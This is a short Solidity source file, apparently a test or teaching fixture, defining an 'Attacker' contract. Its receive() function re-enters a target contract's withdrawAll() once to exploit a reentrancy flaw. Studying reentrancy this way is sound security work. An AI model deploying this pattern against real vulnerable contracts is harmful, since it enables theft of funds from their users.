// Minimal re-entrant attacker that during receive() calls back into c.withdrawAll()
contract Attacker {
    C public c;
    bool public entered;

    constructor(C _c) {
        c = _c;
        entered = false;
    }

    // deposit helper
    receive() external payable {
        // on receiving ETH from c, try to re-enter withdrawAll once
        if (!entered) {
            entered = true;
            // re-enter
            c.withdrawAll();
        }
    }

    function deposit() external payable {
        // deposit into target contract
        c.deposit{value: msg.value}();
    }

    function callWithdrawAll() external {
        // call withdrawAll on target; this will trigger receive during external call if c sends Ether
        c.withdrawAll();
    }
}

